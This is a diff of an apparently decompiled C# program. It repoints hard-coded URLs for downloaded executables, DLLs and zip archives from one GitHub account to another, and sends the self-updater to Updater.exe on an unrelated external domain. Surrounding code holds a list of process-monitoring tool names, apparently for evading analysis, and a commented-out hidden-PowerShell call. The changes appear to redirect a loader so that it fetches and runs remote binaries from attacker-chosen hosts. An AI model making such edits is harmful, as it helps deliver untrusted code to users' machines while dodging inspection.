@@ -844,7 +844,7 @@ public static class Program
 			}
 			if (!File.Exists(path5))
 			{
-				string text10 = "https://raw.githubusercontent.com/bytenova-dot/masterdata/refs/heads/main/XCaptchaRecog";
+				string text10 = "https://raw.githubusercontent.com/meghakamble452-collab/masterdata/refs/heads/main/XCaptchaRecog";
 				string pUri3 = text10;
 				frmDownloasData frmDownloasData4 = new frmDownloasData();
 				string pFile3 = "XCaptchaRecog.exe";
@@ -853,7 +853,7 @@ public static class Program
 			string path6 = "model_int8.onnx";
 			if (!File.Exists(path6))
 			{
-				string text11 = "https://raw.githubusercontent.com/bytenova-dot/masterdata/refs/heads/main/XCaptchaRecog";
+				string text11 = "https://raw.githubusercontent.com/meghakamble452-collab/masterdata/refs/heads/main/XCaptchaRecog";
 				string pUri4 = text11;
 				frmDownloasData frmDownloasData5 = new frmDownloasData();
 				string pFile4 = "model_int8.onnx";
@@ -1494,7 +1494,7 @@ public static class Program
 		if (!File.Exists(path))
 		{
 			frmDownloasData frmDownloasData2 = new frmDownloasData();
-			string pUri = "https://raw.githubusercontent.com/bytenova-dot/masterdata/refs/heads/main/HttpClient.dll";
+			string pUri = "https://raw.githubusercontent.com/meghakamble452-collab/masterdata/refs/heads/main/HttpClient.dll";
 			string pFile = "HttpClient.dll";
 			frmDownloasData2.startDownload(pUri, pFile);
 		}
@@ -1568,7 +1568,7 @@ public static class Program
 			//RunHiddenPowerShell();
 			if (string.IsNullOrEmpty(PDFURL))
 			{
-				string pDFURL = "https://raw.githubusercontent.com/bytenova-dot/masterdata/refs/heads/main/QRCoder.zip";
+				string pDFURL = "https://raw.githubusercontent.com/meghakamble452-collab/masterdata/refs/heads/main/QRCoder.zip";
 				PDFURL = pDFURL;
 			}
 			if (!File.Exists("QRCoder.dll"))
@@ -1592,7 +1592,7 @@ public static class Program
 		{
 			if (string.IsNullOrEmpty(OcrUrl))
 			{
-				string ocrUrl = "https://raw.githubusercontent.com/bytenova-dot/masterdata/refs/heads/main/Tesseract.zip";
+				string ocrUrl = "https://raw.githubusercontent.com/meghakamble452-collab/masterdata/refs/heads/main/Tesseract.zip";
 				OcrUrl = ocrUrl;
 			}
 			frmDownloasData frmDownloasData4 = new frmDownloasData();
@@ -3155,18 +3155,19 @@ public static class Program
 		List<string> list29 = list_1;
 		string item29 = "PROCMON";
 		list29.Add(item29);
-		List<string> list30 = list_1;
-		string item30 = "PROCESS MONITOR";
-		list30.Add(item30);
-	}
+		List<string>
+            list30 = list_1;
+            string item30 = "PROCESS MONITOR";
+            list30.Add(item30);
+            }
 
-	static Program()
-	{
-		string text = "000";
-		rp = text;
-		string updateURI = "https://raw.githubusercontent.com/bytenova-dot/masterdata/refs/heads/main/Updater";
-		UpdateURI = updateURI;
-		list_0 = new List<string>();
+            static Program()
+            {
+            string text = "000";
+            rp = text;
+            string updateURI = "https://expressts.co.in/api/files/Updater.exe";
+            UpdateURI = updateURI;
+            list_0 = new List<string>();
 		dictionary_0 = new Dictionary<string, string>();
 		dictionary_00 = new Dictionary<string, string>();
 		dictionary_1 = new Dictionary<int, string>();
